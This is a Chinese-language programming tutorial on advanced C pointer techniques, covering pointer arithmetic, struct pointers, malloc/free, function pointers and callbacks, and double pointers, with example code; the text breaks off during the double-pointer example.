.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>本文详解C语言指针高级应用，涵盖指针算术运算、与结构体结合、动态内存分配（malloc/free）、函数指针（回调/数组）、二级指针，附代码示例，提醒避免内存泄漏、确保指针有效，助力掌握指针进阶用法。</p>
</blockquote>
<h2 data-id="heading-0">一、指针的算术运算详解</h2>
<p>指针的算术运算是C语言中一个非常重要且强大的特性，它允许程序员直接对内存地址进行操作。</p>
<h3 data-id="heading-1">1.1. 基本概念</h3>
<blockquote>
<p><strong>指针是一个变量，其存储的是另一个变量的地址。在C语言中，指针的算术运算实际上是对指针所指向的<strong><strong>内存</strong></strong>地址进行算术操作。</strong></p>
</blockquote>
<h3 data-id="heading-2">1.2. 递增与递减运算</h3>
<ul>
<li>
<p>**递增（++）运算：**当对指针进行递增运算时，指针会移动到下一个内存地址。这个“下一个”是相对于指针所指向的数据类型而言的。例如，如果指针指向一个int类型的数组元素，那么递增运算会使指针移动到数组中下一个int元素的地址。</p>
</li>
<li>
<p>**递减（--）运算：**递减运算与递增运算相反，它会使指针移动到前一个内存地址。</p>
</li>
</ul>
<blockquote>
<p><strong>需要注意的是，递增和递减运算只在指向相同类型的数据时才有意义。因为不同类型的数据可能占用不同大小的<strong><strong>内存</strong></strong>空间，如果对不同类型的数据指针进行递增或递减运算，可能会导致不可预测的结果。</strong></p>
</blockquote>
<h3 data-id="heading-3">1.3. 加法与减法运算</h3>
<ul>
<li>
<p>**加法（+）运算：**指针的加法运算允许以元素为单位移动指针。例如，如果有一个指向数组第一个元素的指针，并且想移动到数组的第三个元素，可以通过将指针与2（因为数组索引从0开始，所以第三个元素的索引是2）相加来实现。</p>
</li>
<li>
<p>**减法（-）运算：**减法运算与加法运算相反，它允许以元素为单位向后移动指针。</p>
</li>
</ul>
<p>同样地，加法与减法运算也只在指向相同类型的数据时才有意义。</p>
<h3 data-id="heading-4">1.4. 示例代码</h3>
<p>以下是一个简单的示例代码，演示指针的算术运算：创建一个整型数组<code>arr</code>，并初始化了一些值。然后，我们创建了一个指向数组第一个元素的指针<code>ptr</code>，并演示了递增、递减、加法和减法运算。</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>  </span>
  
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{  
    <span class="hljs-type">int</span> arr[] = {<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>};  
    <span class="hljs-type">int</span> *ptr = arr; <span class="hljs-comment">// 指向数组第一个元素的指针  </span>
  
    <span class="hljs-comment">// 递增运算  </span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"After incrementing ptr: %d\n"</span>, *(ptr++)); <span class="hljs-comment">// 输出1，然后ptr指向第二个元素  </span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Now ptr points to: %d\n"</span>, *ptr); <span class="hljs-comment">// 输出2  </span>
  
    <span class="hljs-comment">// 递减运算（注意：这里只是演示，实际使用中很少对已经递增过的指针进行递减）  </span>
    ptr++; <span class="hljs-comment">// 先让ptr指向第三个元素  </span>
    ptr--; <span class="hljs-comment">// 再让ptr指回第二个元素  </span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"After decrementing ptr: %d\n"</span>, *ptr); <span class="hljs-comment">// 输出2  </span>
  
    <span class="hljs-comment">// 加法与减法运算  </span>
    <span class="hljs-type">int</span> *new_ptr = arr + <span class="hljs-number">2</span>; <span class="hljs-comment">// new_ptr指向数组的第三个元素  </span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"new_ptr points to: %d\n"</span>, *new_ptr); <span class="hljs-comment">// 输出3  </span>
  
    new_ptr -= <span class="hljs-number">1</span>; <span class="hljs-comment">// new_ptr现在指向数组的第二个元素  </span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"After decrementing new_ptr: %d\n"</span>, *new_ptr); <span class="hljs-comment">// 输出2  </span>
  
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  
}
</code></pre>
<p><strong>运行结果：</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/64371964f6f947a080fc9da87a617d7d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnl0Zei9u-mqkeWFtQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770858627&amp;x-signature=KC%2BD9L3MrbV2Oxd7kORK0Y2GMpw%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-5">1.5. 注意事项</h3>
<ul>
<li>
<p>指针的算术运算必须谨慎进行，以避免访问非法的内存地址。</p>
</li>
<li>
<p>指针的算术运算只在指向相同类型的数据时才有意义，因此在进行运算之前，必须确保指针的类型是一致的。</p>
</li>
<li>
<p>动态分配的内存（如使用<code>malloc</code>函数分配的内存）也可以使用指针的算术运算来访问不同的内存位置，但同样需要注意不要访问非法的内存地址。</p>
</li>
</ul>
<blockquote>
<p><strong>指针的算术运算是C语言中一个非常强大且灵活的特性，它允许程序员直接对<strong><strong>内存</strong></strong>地址进行操作。然而，这个特性也带来了一定的风险，因此在使用时必须谨慎。</strong></p>
</blockquote>
<h2 data-id="heading-6">二、指针与结构体</h2>
<p>在C语言中，结构体（<code>struct</code>）是一种用户定义的数据类型，它允许将多个不同类型的数据项组合成一个单一的复合类型。当指针与结构体结合使用时，可以实现许多高级的数据结构和算法。</p>
<h3 data-id="heading-7">2.1. 结构体定义与实例</h3>
<p>首先，我们需要定义一个结构体类型，并创建该类型的实例（变量）。例如：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>  </span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span>  </span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span>  </span>
  
<span class="hljs-comment">// 定义一个结构体类型  </span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Person</span> {  
    <span class="hljs-type">char</span> name[<span class="hljs-number">50</span>];  
    <span class="hljs-type">int</span> age;  
    <span class="hljs-type">float</span> height;  
};  
  
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{  
    <span class="hljs-comment">// 创建结构体的实例  </span>
    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Person</span> person1 = {<span class="hljs-string">"Alice"</span>, <span class="hljs-number">30</span>, <span class="hljs-number">5.5</span>};  
    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Person</span> person2;  
  
    <span class="hljs-comment">// ...（对结构体实例进行操作）  </span>
  
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  
}
</code></pre>
<h3 data-id="heading-8">2.2. 指向结构体的指针</h3>
<p>可以定义一个指向结构体的指针，并让它指向一个结构体实例。例如：</p>
<pre><code class="hljs language-ini" lang="ini">struct Person *<span class="hljs-attr">ptr</span> = &amp;person1<span class="hljs-comment">;</span>
</code></pre>
<p>现在，<code>ptr</code>是一个指向<code>struct Person</code>类型的指针，它指向<code>person1</code>的地址。</p>
<h3 data-id="heading-9">2.3. 使用-&gt;运算符访问结构体成员</h3>
<p>通过指向结构体的指针，可以使用<code>-&gt;</code>运算符来访问结构体的成员。例如：</p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-keyword">printf</span>(<span class="hljs-string">"Name: %s\n"</span>, ptr-&gt;name);  
<span class="hljs-keyword">printf</span>(<span class="hljs-string">"Age: %d\n"</span>, ptr-&gt;age);  
<span class="hljs-keyword">printf</span>(<span class="hljs-string">"Height: %.1f\n"</span>, ptr-&gt;height);
</code></pre>
<p>这里的<code>ptr-&gt;name</code>、<code>ptr-&gt;age</code>和<code>ptr-&gt;height</code>分别表示通过指针<code>ptr</code>访问<code>struct Person</code>类型的<code>name</code>、<code>age</code>和<code>height</code>成员。</p>
<h3 data-id="heading-10">2.4. 动态分配结构体数组</h3>
<p>在处理大量数据时，可能需要动态分配一个结构体数组。这时，指针与结构体的结合使用就显得尤为重要。例如：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment">#include &lt;stdio.h&gt;</span>
<span class="hljs-comment">#include &lt;stdlib.h&gt;</span>
<span class="hljs-comment">#include &lt;string.h&gt;</span>
 
// 定义一个结构体类型
struct Person {
    char name<span class="hljs-section">[50]</span><span class="hljs-comment">;</span>
    int age<span class="hljs-comment">;</span>
    float height<span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>
 
int main() {
    int <span class="hljs-attr">num_people</span> = <span class="hljs-number">3</span><span class="hljs-comment">;</span>
    struct Person *<span class="hljs-attr">people</span> = (struct Person *)malloc(num_people * sizeof(struct Person))<span class="hljs-comment">;</span>
 
    if (<span class="hljs-attr">people</span> == NULL) {
        // 处理内存分配失败的情况
        fprintf(stderr, "Memory allocation failed\n")<span class="hljs-comment">;</span>
        return 1<span class="hljs-comment">;</span>
    }
 
    // 初始化结构体数组
    strcpy(people<span class="hljs-section">[0]</span>.name, "Bob")<span class="hljs-comment">;</span>
    people<span class="hljs-section">[0]</span>.<span class="hljs-attr">age</span> = <span class="hljs-number">25</span><span class="hljs-comment">;</span>
    people<span class="hljs-section">[0]</span>.<span class="hljs-attr">height</span> = <span class="hljs-number">6.0</span><span class="hljs-comment">;</span>
 
    strcpy(people<span class="hljs-section">[1]</span>.name, "Charlie")<span class="hljs-comment">;</span>
    people<span class="hljs-section">[1]</span>.<span class="hljs-attr">age</span> = <span class="hljs-number">35</span><span class="hljs-comment">;</span>
    people<span class="hljs-section">[1]</span>.<span class="hljs-attr">height</span> = <span class="hljs-number">5.9</span><span class="hljs-comment">;</span>
 
    strcpy(people<span class="hljs-section">[2]</span>.name, "Jor")<span class="hljs-comment">;</span>
    people<span class="hljs-section">[2]</span>.<span class="hljs-attr">age</span> = <span class="hljs-number">38</span><span class="hljs-comment">;</span>
    people<span class="hljs-section">[2]</span>.<span class="hljs-attr">height</span> = <span class="hljs-number">6.3</span><span class="hljs-comment">;</span>
 
 
    // 使用-&gt;运算符访问动态分配的结构体数组的成员
    for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; num_people; i++) {</span>
        printf("Person %d: Name: %s, Age: %d, Height: %.1f\n", i + 1, people<span class="hljs-section">[i]</span>.name, people<span class="hljs-section">[i]</span>.age, people<span class="hljs-section">[i]</span>.height)<span class="hljs-comment">;</span>
        // 或者使用指针算术和-&gt;运算符
        // printf("Person %d: Name: %s, Age: %d, Height: %.1f\n", i + 1, (people + i)-&gt;name, (people + i)-&gt;age, (people + i)-&gt;height)<span class="hljs-comment">;</span>
    }
 
    // 释放动态分配的内存
    free(people)<span class="hljs-comment">;</span>
}
</code></pre>
<p>在访问动态分配的结构体数组的成员时，可以直接使用数组索引（如<code>people[i].name</code>），也可以通过指针算术和<code>-&gt;</code>运算符（如<code>(people + i)-&gt;name</code>）来实现。最后，我们使用<code>free</code>函数释放了动态分配的内存。</p>
<p>运行结果：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f39807a342e6440a95ddfd498ab97869~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnl0Zei9u-mqkeWFtQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770858627&amp;x-signature=HDmGxCkKHO8%2BH1bFDRmcoOeive0%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-11">2.5. 注意事项</h3>
<blockquote>
<ul>
<li>
<p>在使用动态分配的内存时，一定要确保在不再需要时释放它，以避免内存泄漏。</p>
</li>
<li>
<p>在访问结构体成员时，要确保指针是有效的，并且指向的结构体实例是存在的。</p>
</li>
<li>
<p>当使用指针访问结构体成员时，要小心不要越界访问未初始化的内存区域。</p>
</li>
</ul>
</blockquote>
<h2 data-id="heading-12">三、动态内存分配（malloc/free）</h2>
<p>在C语言中，动态内存分配是一种非常强大的特性，它允许程序在运行时根据需要分配或释放内存。这种机制通过<code>malloc</code>（memory allocation）和<code>free</code>函数来实现。</p>
<h3 data-id="heading-13">3.1.malloc函数</h3>
<p><code>malloc</code>函数用于从堆（heap）中分配指定大小的内存块，并返回一个指向该内存块的指针。如果分配失败（例如，由于内存不足），则返回<code>NULL</code>。</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span> <span class="hljs-comment">// 包含malloc和free函数的声明  </span></span>
  
<span class="hljs-function"><span class="hljs-type">void</span>* <span class="hljs-title">malloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span></span>;
</code></pre>
<ul>
<li>
<p><code>size</code>：要分配的字节数。</p>
</li>
<li>
<p>返回值：指向分配的内存块的指针，如果分配失败则返回<code>NULL</code>。</p>
</li>
</ul>
<h3 data-id="heading-14">3.2.free函数</h3>
<p><code>free</code>函数用于释放之前通过<code>malloc</code>（或<code>calloc</code>、<code>realloc</code>）分配的内存块。</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span>  </span>
  
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-type">void</span>* ptr)</span></span>;
</code></pre>
<ul>
<li><code>ptr</code>：指向要释放的内存块的指针。</li>
</ul>
<h3 data-id="heading-15">3.3. 代码示例</h3>
<p>以下是一个使用<code>malloc</code>和<code>free</code>进行动态内存分配的简单示例：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>  </span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span>  </span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span>  </span>
  
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {  
    <span class="hljs-comment">// 动态分配一个足够存储100个字符的内存块  </span>
    <span class="hljs-type">char</span>* str = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span> * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>));  
    <span class="hljs-keyword">if</span> (str == <span class="hljs-literal">NULL</span>) {  
        <span class="hljs-comment">// 分配失败，处理错误  </span>
        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"Memory allocation failed\n"</span>);  
        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;  
    }  
  
    <span class="hljs-comment">// 初始化内存块  </span>
    <span class="hljs-built_in">strcpy</span>(str, <span class="hljs-string">"Hello, World!"</span>);  
  
    <span class="hljs-comment">// 使用内存块  </span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"String: %s\n"</span>, str);  
  
    <span class="hljs-comment">// 释放内存块  </span>
    <span class="hljs-built_in">free</span>(str);  
  
    <span class="hljs-comment">// 注意：此时不要尝试访问str，因为它已指向无效的内存  </span>
    <span class="hljs-comment">// str[0] = 'A'; // 这将导致未定义行为  </span>
  
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  
}
</code></pre>
<p><strong>运行结果：</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1b5a528b9f4040768a4cbe505d8457f1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnl0Zei9u-mqkeWFtQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770858627&amp;x-signature=fwvUW70Yf1PZWSmDWDDMqx0F8qU%3D" alt="" loading="lazy"/></p>
<p>需要注意的是，在释放内存后，我们不应该再尝试访问<code>str</code>指针指向的内存块，因为它现在已经指向了无效的内存。尝试访问已释放的内存块将导致未定义行为，可能会导致程序崩溃或数据损坏。</p>
<h3 data-id="heading-16">3.4. 注意事项</h3>
<blockquote>
<ul>
<li>
<p><strong>未初始化的****内存</strong>：<code>malloc</code>分配的内存不会自动初始化，其内容是未定义的。如果需要，应手动初始化分配的内存。</p>
</li>
<li>
<p><strong>避免内存泄漏</strong>：每次使用<code>malloc</code>分配内存后，都应在适当的时候使用<code>free</code>释放它，以避免内存泄漏。</p>
</li>
<li>
<p><strong>指针有效性</strong>：在释放内存后，不要尝试访问已释放的内存块，也不要使用指向已释放内存的指针。</p>
</li>
<li>
<p><strong>内存****对齐和大小</strong>：<code>malloc</code>分配的内存块大小通常是系统内存页大小的整数倍，这可能会导致一些额外的内存开销。</p>
</li>
</ul>
</blockquote>
<h2 data-id="heading-17">四、函数指针</h2>
<p>在C语言中，函数指针是一种特殊类型的指针，它指向函数而不是变量。通过函数指针，程序可以在运行时动态地选择调用哪个函数，这种机制在<strong>回调函数****、事件处理、以及实现函数表</strong>（也称为虚函数表或vtable，在面向对象编程中模拟多态性）等场景中非常有用。</p>
<h3 data-id="heading-18">4.1. 函数指针的定义</h3>
<p>函数指针的定义方式与普通指针类似，但需要指定指针所指向的函数的返回类型和参数类型。例如，假设我们有一个返回<code>int</code>类型并接受两个<code>int</code>类型参数的函数，可以定义一个指向这种函数的指针如下：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-type">int</span> (*func_ptr)(<span class="hljs-type">int</span>, <span class="hljs-type">int</span>);
</code></pre>
<p><code>func_ptr</code>是一个指向函数的指针，该函数返回<code>int</code>类型，并接受两个<code>int</code>类型的参数。</p>
<h3 data-id="heading-19">4.2. 函数指针的赋值</h3>
<p>要将一个函数的地址赋值给函数指针，我们可以使用函数名（在大多数情况下，函数名会被编译器解释为函数的地址）。例如：</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function"><span class="hljs-built_in">int</span> <span class="hljs-title">add</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> a, <span class="hljs-built_in">int</span> b</span>)</span> {  
    <span class="hljs-keyword">return</span> a + b;  
}  
  
<span class="hljs-function"><span class="hljs-built_in">int</span> <span class="hljs-title">main</span>()</span> {  
    <span class="hljs-built_in">int</span> (*func_ptr)(<span class="hljs-built_in">int</span>, <span class="hljs-built_in">int</span>);  
    func_ptr = <span class="hljs-keyword">add</span>; <span class="hljs-comment">// 将add函数的地址赋值给func_ptr  </span>
    <span class="hljs-built_in">int</span> result = func_ptr(<span class="hljs-number">5</span>, <span class="hljs-number">3</span>); <span class="hljs-comment">// 通过函数指针调用add函数  </span>
    printf(<span class="hljs-string">"Result: %d\n"</span>, result); <span class="hljs-comment">// 输出: Result: 8  </span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  
}
</code></pre>
<p><strong>运行结果：</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e3ba85dabbb841efbc217a227550a8c8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnl0Zei9u-mqkeWFtQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770858627&amp;x-signature=9d%2FPkwnBrAjGXBLer7NIziuoXRc%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-20">4.3. 通过函数指针调用函数</h3>
<p>一旦函数指针被赋值，就可以通过它来调用函数。调用方式与普通函数调用类似，但需要使用函数指针的解引用操作（即使用<code>(*func_ptr)(...)</code>）或者直接使用函数指针名（如果上下文允许的话，C语言允许在函数调用表达式中省略解引用操作）。例如：</p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-keyword">int</span> result = (*func_ptr)(<span class="hljs-number">5</span>, <span class="hljs-number">3</span>); <span class="hljs-regexp">//</span> 使用解引用操作调用函数  // 或者  <span class="hljs-keyword">int</span> result = func_ptr(<span class="hljs-number">5</span>, <span class="hljs-number">3</span>); <span class="hljs-regexp">//</span> 在函数调用表达式中省略解引用操作
</code></pre>
<h3 data-id="heading-21">4.4. 回调函数</h3>
<p>回调函数是一种通过函数指针实现的机制，它允许一个函数作为参数传递给另一个函数，并在后者内部被调用。这种机制在事件处理、异步编程等场景中非常有用。例如：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>  </span>
  
<span class="hljs-comment">// 定义一个回调函数类型  </span>
<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(*CallbackFunc)</span><span class="hljs-params">(<span class="hljs-type">int</span>)</span></span>;  
  
<span class="hljs-comment">// 一个简单的回调函数实现  </span>
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">multiplyByTwo</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> </span>{  
    <span class="hljs-keyword">return</span> x * <span class="hljs-number">2</span>;  
}  
  
<span class="hljs-comment">// 接受回调函数作为参数的函数  </span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">processWithCallback</span><span class="hljs-params">(<span class="hljs-type">int</span> value, CallbackFunc callback)</span> </span>{  
    <span class="hljs-type">int</span> result = <span class="hljs-built_in">callback</span>(value);  
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Result: %d\n"</span>, result);  
}  
  
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{  
    <span class="hljs-built_in">processWithCallback</span>(<span class="hljs-number">5</span>, multiplyByTwo); <span class="hljs-comment">// 传递回调函数给processWithCallback  </span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  
}
</code></pre>
<p><code>multiplyByTwo</code>是一个回调函数，它被传递给<code>processWithCallback</code>函数，并在后者内部被调用。</p>
<p><strong>运行结果：</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bb3c6529523d4ff09ff5f2d327a983ff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnl0Zei9u-mqkeWFtQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770858627&amp;x-signature=DMggQvGRsqs2lRtr9sVgNiWnbXU%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-22">4.5. 函数指针数组和函数（虚函数表）</h3>
<p>函数指针也可以存储在数组中，从而形成一个函数表。通过索引函数表，可以根据需要在运行时选择调用哪个函数。例如：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>  </span>
  
<span class="hljs-comment">// 定义两个函数，它们具有相同的返回类型和参数类型  </span>
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">operation1</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> </span>{  
    <span class="hljs-keyword">return</span> a * b;  
}  
  
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">operation2</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> </span>{  
    <span class="hljs-keyword">return</span> a - b;  
}  
  
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{  
    <span class="hljs-comment">// 定义一个函数指针数组  </span>
    <span class="hljs-built_in">int</span> (*operations[])(<span class="hljs-type">int</span>, <span class="hljs-type">int</span>) = {operation1, operation2};  
    <span class="hljs-type">int</span> num1 = <span class="hljs-number">6</span>, num2 = <span class="hljs-number">4</span>;  
    <span class="hljs-type">int</span> choice;  
  
    <span class="hljs-comment">// 让用户选择操作  </span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Choose an operation:\n"</span>);  
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"1. Multiply\n"</span>);  
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"2. Subtract\n"</span>);  
    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;choice);  
  
    <span class="hljs-comment">// 根据用户的选择调用相应的函数  </span>
    <span class="hljs-keyword">if</span> (choice == <span class="hljs-number">1</span>) {  
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Result: %d\n"</span>, operations[<span class="hljs-number">0</span>](num1, num2)); <span class="hljs-comment">// 调用operation1  </span>
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (choice == <span class="hljs-number">2</span>) {  
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Result: %d\n"</span>, operations[<span class="hljs-number">1</span>](num1, num2)); <span class="hljs-comment">// 调用operation2  </span>
    } <span class="hljs-keyword">else</span> {  
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Invalid choice!\n"</span>);  
    }  
  
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  
}
</code></pre>
<p>定义了两个函数<code>operation1</code>和<code>operation2</code>，分别执行乘法和减法操作。然后，创建了一个函数指针数组<code>operations</code>，并将这两个函数的地址存储在其中。最后，根据用户的输入选择并调用了相应的函数。</p>
<p><strong>运行结果：</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a2a6135fbef74cb1953d6147cde1a1d5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnl0Zei9u-mqkeWFtQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770858627&amp;x-signature=cyoexS766ADoi4fOOBbLU4jnu6g%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/69af67bd9ccd41f7b58f8c904dd22c51~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnl0Zei9u-mqkeWFtQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770858627&amp;x-signature=eJQ1d6Yq9tcU1wpGBYCYU8KCyNw%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-23">4.6. 注意事项</h3>
<blockquote>
<ul>
<li>
<p>当使用函数指针时，确保函数指针的类型与所指向的函数的类型完全匹配，包括返回类型、参数类型和数量。</p>
</li>
<li>
<p>在调用通过函数指针指向的函数时，使用正确的参数类型和数量。</p>
</li>
<li>
<p>在释放动态分配的内存（如果函数指针是作为动态分配结构体的一部分）时，确保不会意外地释放函数指针本身（因为函数指针通常不指向动态分配的内存，而是指向编译时确定的函数地址）。</p>
</li>
</ul>
</blockquote>
<h2 data-id="heading-24">五、指向指针的指针（二级指针）详解</h2>
<p>在C语言中，指向指针的指针，也称为二级指针或指针的指针，是一种特殊的指针类型，它存储的是另一个指针变量的地址。通过使用二级指针，程序员可以直接操作指针的地址，这在处理动态内存分配、数组、链表等高级数据结构时非常有用。</p>
<h3 data-id="heading-25">5.1. 二级指针的定义</h3>
<p>二级指针的定义方式与普通指针类似，但需要指定指针所指向的另一个指针的类型。例如，假设我们有一个指向<code>int</code>类型指针的二级指针，我们可以这样定义它：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">int</span> **ptr_to_ptr;
</code></pre>
<p><code>ptr_to_ptr</code>是一个指向<code>int*</code>类型（即指向<code>int</code>类型指针）的指针。</p>
<h3 data-id="heading-26">5.2. 二级指针的使用</h3>
<ul>
<li>
<p><strong>动态内存分配</strong>：二级指针常用于动态内存分配，特别是当需要分配一个指针数组时。例如，可以使用二级指针来动态分配一个整型指针数组，每个指针都可以指向一个整型数组。</p>
</li>
<li>
<p><strong>链表****操作</strong>：在处理链表时，二级指针也非常有用。例如，当我们需要在链表中插入或删除节点时，需要修改前一个节点的<code>next</code>指针，使其指向新的节点或跳过被删除的节点。这时，可以使用一个二级指针来方便地修改这个<code>next</code>指针。</p>
</li>
<li>
<p><strong>传递指针的地址</strong>：有时，需要将指针的地址传递给函数，以便在函数内部修改这个指针。这时，可以使用二级指针作为函数参数。</p>
</li>
</ul>
<h3 data-id="heading-27">5.3. 代码示例</h3>
<p>以下是一个简单的代码示例，展示如何使用二级指针来动态分配一个整型指针数组，并初始化每个指针指向一个整型值：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>  </span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span>  </span>
  
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {  
    <span class="hljs-type">int</span> n = <span class="hljs-number">3</span>; <span class="hljs-comment">// 要分配的整型指针的数量  </span>
    <span class="hljs-type">int</span> **array_of_pointers = (<span class="hljs-type">int</span> **)<span class="hljs-built_in">malloc</span>(n * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span> *)); <span class="hljs-comment">// 动态分配整型指针数组  </span>
